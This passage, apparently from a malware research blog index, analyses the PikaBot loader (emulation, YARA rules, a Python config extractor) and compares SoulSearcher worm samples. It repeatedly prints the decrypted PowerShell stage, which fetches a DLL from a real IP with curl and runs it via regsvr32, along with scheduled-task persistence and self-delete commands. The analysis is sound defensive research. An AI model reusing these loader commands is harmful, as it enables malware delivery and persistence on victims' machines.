&#39;{8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6}&#39;, 5902983: &#39;GetLastError&#39;, 5903051: &#39;wsprintfW&#39;, 5903096: &#39;SOFTWARE %s&#39;, 5903256: &#39;RegCreateKeyExW&#39;, 5903317: &#39;wsprintfW&#39;, 5903362: &#39;schtasks.exe /Create /F /TN &#34;%s&#34; /TR &#34; cmd /q /c start /min &#34; &#34; powershell &#34;$%s = Get-ItemProperty -Path HKCU: Software %s; powershell -encodedcommand $%s.%s &#34;&#34; /SC MINUTE /MO %s&#39;, 5903947: &#39;{8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6}&#39;, 5904190: &#39; x00 x01 x08 x01 x00 x01 x08 x01 x08 x01 x08 x01 x00 x01 x08 x01 x08 x01 x08 x01 x00 x01 x08 x01 x08 x01 x08 x01 x08 x01 x00&#39;, 5904395: &#39;@@H@HHH@H@HH@@@@H&#39;, 5904475: &#39; x00 x00&#39;, 5904520: &#39;GetModuleFileNameW&#39;, 5904580: &#39;wsprintfW&#39;, 5904636: &#39;@H@ x08@H@ x08@@HH@HH@@HHH@@@@H x08@ x08@ x08@ x08@@&#39;, 5904799: &#39;CreateProcessW&#39;, 5905068: &#39;RegSetValueExW&#39;, 5905134: &#39;&#39;, 5905356: &#39;RegCloseKey&#39;, 5905811: &#39;CreateProcessW&#39;, 5906451: &#39;Kernel32.dll&#39;, 5906497: &#39;User32.dll&#39;, 5906549: &#39;Advapi32.dll&#39;} . Label Strings in IDA . def set_hexrays_comment(address, text): &#39;&#39;&#39; set comment in decompiled code &#39;&#39;&#39; cfunc = idaapi.decompile(address) tl = idaapi.treeloc_t() tl.ea = address tl.itp = idaapi.ITP_SEMI cfunc.set_user_cmt(tl, text) cfunc.save_user_cmts() def set_comment(address, text): ## Set in dissassembly idc.set_cmt(address, text,0) ## Set in decompiled data set_hexrays_comment(address, text) . Mutex . Loll they create a hard coded mutex {8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6} . start = 0x005A11C9 # start = 0x005A18FC end = 0x005A199F dp = Dumpulator(&quot;/tmp/pika2.dmp&quot;, quiet=True) print(&#39;loaded&#39;) dp.start(start, end=end) print(&#39;done&#39;) . loaded done . dp.read(dp.regs.ebp -0x135 + 1, dp.regs.ecx * 2).decode(&#39;utf-16&#39;) . &#39;cmd.exe /C &#34;ping localhost &amp;&amp; DEL /F /S /Q /A %s&#34;&#39; . dp.read(dp.regs.ebp -0x88, 100) . bytearray(b&#39;A x00p x00h x00r x00o x00n x00i x00a x00H x00a x00i x00m x00a x00v x00a x00t x00i x00 x00 x00d/ x00 x00Sq x80Y{p x81xqRuxqZmyqc x00 t1 x003 x00 x00 x00 x06 x14% xf8 r x00wsprintfW x00 xea x1c xba x8d x8f xab x9a x8d x89 x9c x8d xa3 x8d x91 xad x90 xbf x00&#39;) . b&#39;A x00p x00h x00r x00o x00n x00i x00a x00H x00a x00i x00m x00a x00v x00a x00t x00i x00 x00 x00d/ x00 x00&#39;.decode(&#39;utf-16&#39;) . &#39;AphroniaHaimavati x00‚Ω§ x00&#39; . start = 0x005A11C9 end = 0x005A17A0 dp = Dumpulator(&quot;/tmp/pika2.dmp&quot;, quiet=True) print(&#39;loaded&#39;) dp.start(start, end=end) print(&#39;done&#39;) print(dp.regs.ecx) dp.read(dp.regs.ebp -0x308 , dp.regs.ecx*2).decode(&#39;utf-16&#39;) . loaded done 31 . &#39;nonresistantOutlivesDictatorial&#39; . Executing someting via a schedualed task and PowerShell . schtasks.exe /Create /F /TN &quot;{8B30B3CD-2068-4F75-AB1F-FCAE6AF928B6}&quot; /TR &quot; cmd /q /c start /min &quot; &quot; powershell &quot;$nonresistantOutlivesDictatorial = Get-ItemProperty -Path HKCU: Software nonresistantOutlivesDictatorial; powershell -encodedcommand $nonresistantOutlivesDictatorial.AphroniaHaimavati &quot;&quot; /SC MINUTE /MO 1 . Yara Rules . This rule comes from @c3rb3ru5d3d53c. She used Binlex with the following command... . find samples/ -type f | while read i; binlex -i $i | jq -r &#39;select(.trait_tlsh != null and .size &lt; 128) | .trait&#39; | grep -v &#39;89 5d ??&#39; | grep -v &#39;c7 45 ?? ?? ?? ?? ??&#39; | sort | uniq; end | sort | uniq -c | sort -rn | sed &#39;s/^ *//&#39; | grep -P &#39;^2 &#39; | sed &#39;s/^2 //&#39; | blyara -n pika . rule pikabot_0 { meta: author = &quot;@c3rb3ru5d3d53c&quot; description = &quot;Detects PikaBot&quot; created = &quot;2023-03-02&quot; tlp = &quot;white&quot; rev = 1 strings: $trait_0 = { 8d 85 ?? ?? ?? ?? 89 b5 ?? ?? ?? ?? 50 8d 85 ?? ?? ?? ?? 50 8d 85 ?? ?? ?? ?? 50 6a 02 8d 95 ?? ?? ?? ?? 59 e8 40 05 00 00 ff d0 83 c4 0c 8d 85 ?? ?? ?? ?? 8d 95 ?? ?? ?? ?? 56 50 56 68 3f 00 0f 00 56 56 56 8d 85 ?? ?? ?? ?? 50 68 01 00 00 80 6a 06 59 e8 10 05 00 00 ff d0 85 c0 0f 85 b5 01 00 00} $trait_1 = { 55 8b ec 51 51 89 4d ?? 56 be c7 26 00 00 57 8b fa 85 c9 74 36 85 ff 74 32 33 c0 89 45 ?? 53 8a 1c 08 8d 43 ?? 0f b6 c8 8d 53 ?? 80 fa 19 0f b6 c3 0f 47 c8 8b 45 ?? 6b f6 05 0f be c9 03 f1 8b 4d ?? 40 89 45 ?? 3b c7 72 d5 5b 5f 8b c6 5e c9 c3} condition: uint16(0) == 0x5a4d and uint32(uint32(0x3c)) == 0x00004550 and 1 of them } . Results . 3ba484fd9430dda5ea691c86ed0cd6e95f1e401d7b444c0d6465545a03ae20b7 | c15c4a73728ea1b3e6688066bb1fdea841d42b910fb2883289cb26003474af64 | 8528b4fbb050be27debef474bd27d441d92196f5d19840f94afa979e8483c8ef | add0e82c68959b9c88485da47178295d80bd6752dd7f0dd4c62cf80bdbf1939c | 05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3 | 4fb5b0da3a557a7dac922010a2b888a91055c4381cf494a6336a674be3bb4a45 | 9754d73feff432298ab129b21a09faa38c3a4ab9a480dbef2eb58dd7d4a151b0 | e8c7d64a29182d3f84a956ed5bb8a8abc2b5459fa939eb17b00c9513240c817e | 13f98d53182d72abd4b8cfe75487d63f6184061eba69c76a2ac21455a81e5230 | . This rule comes from crisp bag! . /* Unpac.me results: e8c7d64a29182d3f84a956ed5bb8a8abc2b5459fa939eb17b00c9513240c817e 13f98d53182d72abd4b8cfe75487d63f6184061eba69c76a2ac21455a81e5230 05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3 4fb5b0da3a557a7dac922010a2b888a91055c4381cf494a6336a674be3bb4a45 3ba484fd9430dda5ea691c86ed0cd6e95f1e401d7b444c0d6465545a03ae20b7 9754d73feff432298ab129b21a09faa38c3a4ab9a480dbef2eb58dd7d4a151b0 8528b4fbb050be27debef474bd27d441d92196f5d19840f94afa979e8483c8ef add0e82c68959b9c88485da47178295d80bd6752dd7f0dd4c62cf80bdbf1939c c15c4a73728ea1b3e6688066bb1fdea841d42b910fb2883289cb26003474af64 */ rule MAL_PIKABOT_XOR_1 { meta: author = &quot;@qutluch&quot; description = &quot;Detect PIKABOT xor operations (unpakce samples).&quot; version = &quot;1.0&quot; date = &quot;2023-03-03&quot; license = &quot;BSD-2-Clause&quot; hash = &quot;05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3&quot; strings: $ = { 8a 44 0d c0 34 ?? (0f b6 c0 | ?? ?? ?? ??) [0-2] ff ff 41 83 ?? ?? 7c ?? } condition: uint16(0) == 0x5A4D and (uint32(uint32(0x3C)) == 0x00004550) and (uint16(uint32(0x3C)+0x16) &amp; 0x2000) and any of them and filesize &lt; 100KB } . Powershell Loader Script . In the binary there are two encrypted blobs that are identical (starting at the start of the .rdata section). These blobs are decrypted using a simple subtraction or xor decryption algorithm with a single byte. Once decrypted we can see that they are Base64 encoded PowerShell commands. . $nonresistantOutlivesDictatorial = &quot;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&quot;; md $env:APPDATA Microsoft nonresistantOutlivesDictatorial; Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial; Start-Sleep -Seconds 40; $ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)}; Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte; regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; . $nonresistantOutlivesDictatorial = &quot;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&quot;; md $env:APPDATA Microsoft nonresistantOutlivesDictatorial; Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial; Start-Sleep -Seconds 40; $ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)}; Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte; regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; . Scheduled Task and Powershell Misdirection . Possibly in an attempt to evade AV/EDR the loader stage uses a scheduled task with powershell to execute a powershell script used to download and execute Stage 2. The powershell script (see above) is stored in the registry and is then retrieved by the scheduled task powershell and executed. . Config Extraction . Extract the .rdata section | The encrypted blob starts at the beginning of the section | Brute force the single byte xor key using the crib of http | Confim and decrypt and extract the script | . import pefile import base64 import re MALWARE_PATH = &#39;/tmp/loader_05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3.bin&#39; pe = pefile.PE(MALWARE_PATH) section_data = None for s in pe.sections: if s.Name.startswith(b&#39;.rdata&#39;): section_data = s.get_data() break assert section_data is not None def xor(data, key): out = [] for c in data: out.append(c ^ key) return bytes(out) def wide_finder(data): str_end = len(data) for i in range(0, len(data) - 1, 2): if not chr(data[i]).isascii(): str_end = i break if data[i+1] != 0: str_end = i break return data[:str_end] def get_url(ps_string): out = None m = re.search(r&#39;http[^ ]*&#39;, ps_string) if m: out = m.group() return out big_null = section_data.find(b&#39; x00&#39; * 30) section_data = section_data[:big_null] out = None for i in range(1,0xff): egg = bytes([i]) * 16 if egg in section_data: test_out = xor(section_data, i) # This might break if the extra crud on the end of the blob is not b64 friendly test_out_ptxt = base64.b64decode(test_out) if &quot;http&quot;.encode(&quot;utf-16le&quot;) in test_out_ptxt: out = wide_finder(test_out_ptxt) assert out is not None out_ascii = out.decode(&#39;utf-16le&#39;) print(out_ascii) url = get_url(out_ascii) print(url) . $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; https://37.1.215.220/messages/DBcB6q9SM6 . from pathlib import Path class PikaException(Exception): pass def get_ps(file_path): ps_script = None pe = pefile.PE(file_path) section_data = None for s in pe.sections: if s.Name.startswith(b&#39;.rdata&#39;): section_data = s.get_data() break if section_data is None: raise PikaException(&quot;rdata section not found&quot;) big_null = section_data.find(b&#39; x00&#39; * 30) section_data = section_data[:big_null] out = None for i in range(1,0xff): egg = bytes([i]) * 16 if egg in section_data: test_out = xor(section_data, i) # This might break if the extra crud on the end of the blob is not b64 friendly try: test_out_ptxt = base64.b64decode(test_out) if &quot;http&quot;.encode(&quot;utf-16le&quot;) in test_out_ptxt: out = wide_finder(test_out_ptxt) except: pass if out is None: return None return out.decode(&#39;utf-16le&#39;) for file in Path(&#39;/tmp/samples/&#39;).glob(&#39;*&#39;): print(file) print(get_ps(file)) . /tmp/samples/e8c7d64a29182d3f84a956ed5bb8a8abc2b5459fa939eb17b00c9513240c817e $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/3ba484fd9430dda5ea691c86ed0cd6e95f1e401d7b444c0d6465545a03ae20b7 $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/05d1b791865c9551ed8da6a170eb6f945a4d1e79cb70341f589cc47bacf78cc3 $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/c15c4a73728ea1b3e6688066bb1fdea841d42b910fb2883289cb26003474af64 $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/add0e82c68959b9c88485da47178295d80bd6752dd7f0dd4c62cf80bdbf1939c $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/8528b4fbb050be27debef474bd27d441d92196f5d19840f94afa979e8483c8ef $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/4fb5b0da3a557a7dac922010a2b888a91055c4381cf494a6336a674be3bb4a45 $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; /tmp/samples/9754d73feff432298ab129b21a09faa38c3a4ab9a480dbef2eb58dd7d4a151b0 $nonresistantOutlivesDictatorial = &#34;$env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll&#34;;md $env:APPDATA Microsoft nonresistantOutlivesDictatorial;Start-Process (Get-Command curl.exe).Source -NoNewWindow -ArgumentList &#39;--url https://37.1.215.220/messages/DBcB6q9SM6 -X POST --insecure --output &#39;, $nonresistantOutlivesDictatorial;Start-Sleep -Seconds 40;$ungiantDwarfest = Get-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll | %{[Convert]::FromBase64String($_)};Set-Content $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll -Value $ungiantDwarfest -Encoding Byte;regsvr32 /s $env:APPDATA Microsoft nonresistantOutlivesDictatorial AphroniaHaimavati.dll; .",
            "url": "https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html",
            "relUrl": "/pikabot/yara/config/loader/2023/02/26/pikabot.html",
            "date": " ‚Ä¢ Feb 26, 2023"
        }
        
    
  
    
        ,"post20": {
            "title": "SoulSearcher Worm",
            "content": "Overview . We have a Malpedia Yara rule for the targetted campaign dubbed &quot;SoulSearcher&quot; detailed in a Fortinet blog that is matching on thousands of samples! . These samples seem to be very similar (same metadata etc.) but have different hashes. Our assumption is that these samples are part of some self-propogating worm, but we need to figure out... . 1) Is this worm-set of samples related to SoulSearcher 2) What is going on with the worm-set of samples? Are they actually a worm or something else? . Malpedia Yara Rule . rule win_soul_auto { meta: author = &quot;Felix Bilstein - yara-signator at cocacoding dot com&quot; date = &quot;2023-01-25&quot; version = &quot;1&quot; description = &quot;Detects win.soul.&quot; info = &quot;autogenerated rule brought to you by yara-signator&quot; tool = &quot;yara-signator v0.6.0&quot; signator_config = &quot;callsandjumps;datarefs;binvalue&quot; malpedia_reference = &quot;https://malpedia.caad.fkie.fraunhofer.de/details/win.soul&quot; malpedia_rule_date = &quot;20230124&quot; malpedia_hash = &quot;2ee0eebba83dce3d019a90519f2f972c0fcf9686&quot; malpedia_version = &quot;20230125&quot; malpedia_license = &quot;CC BY-SA 4.0&quot; malpedia_sharing = &quot;TLP:WHITE&quot; /* DISCLAIMER * The strings used in this rule have been automatically selected from the * disassembly of memory dumps and unpacked files, using YARA-Signator. * The code and documentation is published here: * https://github.com/fxb-cocacoding/yara-signator * As Malpedia is used as data source, please note that for a given * number of families, only single samples are documented. * This likely impacts the degree of generalization these rules will offer. * Take the described generation method also into consideration when you * apply the rules in your use cases and assign them confidence levels. */ strings: $sequence_0 = { 732f 8b55fc 3b5510 7327 8b55b0 8b5dec } // n = 6, score = 400 // 732f | mov ecx, dword ptr [ebp - 0x18] // 8b55fc | mov dword ptr [ebp - 0x2c], ecx // 3b5510 | mov ecx, dword ptr [ebp - 0x3c] // 7327 | mov dword ptr [ebp - 0x30], edx // 8b55b0 | add ebx, edi // 8b5dec | mov edi, dword ptr [ebp - 0x44] $sequence_1 = { c1e90b 0faf4df0 3bf1 7306 } // n = 4, score = 400 // c1e90b | mov eax, dword ptr [ebp + 8] // 0faf4df0 | cmp eax, dword ptr [ebp - 4] // 3bf1 | jae 0x202 // 7306 | movzx ecx, byte ptr [eax] $sequence_2 = { d3e2 8515???????? 7405 e8???????? } // n = 4, score = 400 // d3e2 | shl edx, cl // 8515???????? | // 7405 | je 7 // e8???????? | $sequence_3 = { 81c7680a0000 81fa00000001 7318 3b45fc } // n = 4, score = 400 // 81c7680a0000 | mov word ptr [edi], bx // 81fa00000001 | add ecx, ecx // 7318 | not edx // 3b45fc | jmp 0x21 $sequence_4 = { 03d2 668939 8d7cd104 c745f800000000 c745e408000000 e9???????? 2bc7 } // n = 7, score = 400 // 03d2 | dec eax // 668939 | lea ecx, [ebp - 0x10] // 8d7cd104 | je 0x5e // c745f800000000 | jne 0x55 // c745e408000000 | dec eax // e9???????? | // 2bc7 | lea ecx, [0x1b354] $sequence_5 = { ff25???????? ff25???????? 48895c2408 4889742410 } // n = 4, score = 400 // ff25???????? | // ff25???????? | // 48895c2408 | dec eax // 4889742410 | mov dword ptr [esp + 8], ebx $sequence_6 = { 8b5dec 8b7d08 e9???????? 5f 5e b801000000 5b } // n = 7, score = 400 // 8b5dec | add ecx, edx // 8b7d08 | mov edx, ecx // e9???????? | // 5f | mov ecx, dword ptr [ebp - 8] // 5e | mov word ptr [ecx + edi*2], dx // b801000000 | cmp eax, dword ptr [ebp - 4] // 5b | jae 0x1ff $sequence_7 = { 5d c3 57 eb05 } // n = 4, score = 400 // 5d | movzx ecx, byte ptr [eax] // c3 | shl esi, 8 // 57 | mov dword ptr [ebp - 0x20], eax // eb05 | mov eax, dword ptr [edi + 0x40] $sequence_8 = { b801000000 e9???????? 8b4f24 8b5f38 3bcb 7305 8b4728 } // n = 7, score = 400 // b801000000 | lea edi, [edi + edi + 1] // e9???????? | // 8b4f24 | cmp edi, 0x40 // 8b5f38 | jb 0xffffffc1 // 3bcb | sub edi, 0x40 // 7305 | mov dword ptr [ebp + 8], eax // 8b4728 | cmp edi, 4 $sequence_9 = { 83c10b 894dec e9???????? 2bc7 2bf7 8bfa } // n = 6, score = 400 // 83c10b | mov edi, eax // 894dec | mov dword ptr [ebp - 8], edx // e9???????? | // 2bc7 | movzx edx, word ptr [edx] // 2bf7 | jae 0xad // 8bfa | cmp dword ptr [ebp - 0x14], 0x13 $sequence_10 = { e8???????? e9???????? 48c7458007000000 4c89742478 664489742468 33c0 4883c9ff } // n = 7, score = 200 // e8???????? | // e9???????? | // 48c7458007000000 | cmp edx, dword ptr [ebp + 0x10] // 4c89742478 | jae 0x2f // 664489742468 | mov edx, dword ptr [ebp - 0x50] // 33c0 | mov ebx, dword ptr [ebp - 0x14] // 4883c9ff | add edi, 0xa68 $sequence_11 = { 488d4dd0 e8???????? ff15???????? 448bc0 488d153e250200 488d4dd0 ff15???????? } // n = 7, score = 200 // 488d4dd0 | test ecx, ecx // e8???????? | // ff15???????? | // 448bc0 | dec eax // 488d153e250200 | mov dword ptr [esp + 8], ebx // 488d4dd0 | dec eax // ff15???????? | $sequence_12 = { 745c 833d????????01 7553 488d0d54b30100 e8???????? 33ff } // n = 6, score = 200 // 745c | sub esp, 0x30 // 833d????????01 | // 7553 | dec eax // 488d0d54b30100 | mov ebx, ecx // e8???????? | // 33ff | dec eax $sequence_13 = { 4533c0 488d55ef 488d4da7 e8???????? } // n = 4, score = 200 // 4533c0 | jae 0xe // 488d55ef | jae 0x31 // 488d4da7 | mov edx, dword ptr [ebp - 4] // e8???????? | $sequence_14 = { 4533c0 488d55c8 488d4df0 e8???????? 488d542448 488d4df0 e8???????? } // n = 7, score = 200 // 4533c0 | mov dword ptr [esp + 8], ebx // 488d55c8 | dec eax // 488d4df0 | mov dword ptr [esp + 0x10], esi // e8???????? | // 488d542448 | push edi // 488d4df0 | dec eax // e8???????? | $sequence_15 = { 498bcc e8???????? 85c0 0f84e9000000 488d15ca0f0200 488bcb e8???????? } // n = 7, score = 200 // 498bcc | dec eax // e8???????? | // 85c0 | mov dword ptr [esp + 8], ebx // 0f84e9000000 | dec eax // 488d15ca0f0200 | mov dword ptr [esp + 0x10], esi // 488bcb | push edi // e8???????? | $sequence_16 = { 4883ec20 4d8b21 4533ff 4d8bf1 } // n = 4, score = 200 // 4883ec20 | push edi // 4d8b21 | jmp 9 // 4533ff | mov dword ptr [ebp - 0x1c], ecx // 4d8bf1 | jmp 0x25 $sequence_17 = { 66f2af 6689442420 48f7d1 4c8d41ff 488d4c2420 e8???????? 488d4c2420 } // n = 7, score = 200 // 66f2af | sub eax, edi // 6689442420 | sub esi, edi // 48f7d1 | mov edi, edx // 4c8d41ff | shr edi, 5 // 488d4c2420 | mov edx, dword ptr [ebp - 8] // e8???????? | // 488d4c2420 | mov word ptr [edx], cx $sequence_18 = { 03d0 8d0452 488b542418 c1e008 4d8d1442 } // n = 5, score = 200 // 03d0 | sub edx, edi // 8d0452 | mov word ptr [ecx + 0x646], dx // 488b542418 | add edi, edx // c1e008 | mov word ptr [ecx + 2], di // 4d8d1442 | mov edx, 2 $sequence_19 = { ffe1 418b5610 85d2 7509 45895e08 e9???????? 83ff10 } // n = 7, score = 200 // ffe1 | mov dword ptr [esp + 0x10], esi // 418b5610 | push edi // 85d2 | dec eax // 7509 | sub esp, 0x30 // 45895e08 | dec eax // e9???????? | // 83ff10 | mov dword ptr [esp + 8], ebx $sequence_20 = { e8???????? 4c8d1d111f0100 4c895c2428 488d154d6d0100 488d4c2428 } // n = 5, score = 200 // e8???????? | // 4c8d1d111f0100 | jmp 0x1f // 4c895c2428 | shr ecx, 0xb // 488d154d6d0100 | imul ecx, dword ptr [ebp - 0x10] // 488d4c2428 | cmp esi, ecx $sequence_21 = { 488d0587fdffff 48894740 488d058cfdffff 48894748 8b442424 4c896770 894768 } // n = 7, score = 200 // 488d0587fdffff | mov ecx, dword ptr [ebp - 0x20] // 48894740 | movzx edx, word ptr [ecx + ebx*2 + 0x180] // 488d058cfdffff | cmp eax, 0x1000000 // 48894748 | sub eax, edi // 8b442424 | sub esi, edi // 4c896770 | mov edi, edx // 894768 | shr edi, 5 $sequence_22 = { 4885c0 746a 4c8bc0 0fb7d3 8bce e8???????? } // n = 6, score = 200 // 4885c0 | dec eax // 746a | sub esp, 0x30 // 4c8bc0 | dec eax // 0fb7d3 | mov ebx, ecx // 8bce | dec eax // e8???????? | condition: 7 of them and filesize &lt; 1400832 } . SoulSearcher Samples . 579fa00bc212a3784d523f8ddd0cfc118f51ca926d8f7ea2eb6e27157ec61260 | 69a9ab243011f95b0a1611f7d3c333eb32aee45e74613a6cddf7bcb19f51c8ab | 0f7af0cad4aade0e7058051a449059b35358ddda075d88b2d289625adc02deef | 1af5252cadbe8cef16b4d73d4c4886ee9cecddd3625e28a59b59773f5a2a9f7f | a6f75af45c331a3fac8d2ce010969f4954e8480cbe9f9ea19ce3c51c44d17e98 | c4efb58723fd75d51eb92302fbd7541e4462f438282582b5efa3c6c7685e69fd | . Comparison . The SoulSearcher samples are either DLLs or they are 64bit, this does not match with our worm-set of 32bit exe files | The metadata of the SoulSearcher samples sometimes spoofs Microsoft Files but none of them spoof Word like our worm-set | There are three functions that are common between the samples 0F7AF0CAD4AADE0E7058051A449059B35358DDDA075D88B2D289625ADC02DEEF these appear to be part of a compression algorithm but it&#39;s uncertain (maybe just open source statically compiled lib, or... same fdev!) | . Question 1 - Is The Worm-Set Part of SoulSearch . It appears as though there is a shares library between the worm-set and the soulsearcher set but there is no other overlap. We can say with medium confidence that these samples are not related and that the overlap is highly likely a shared statically compiled library. 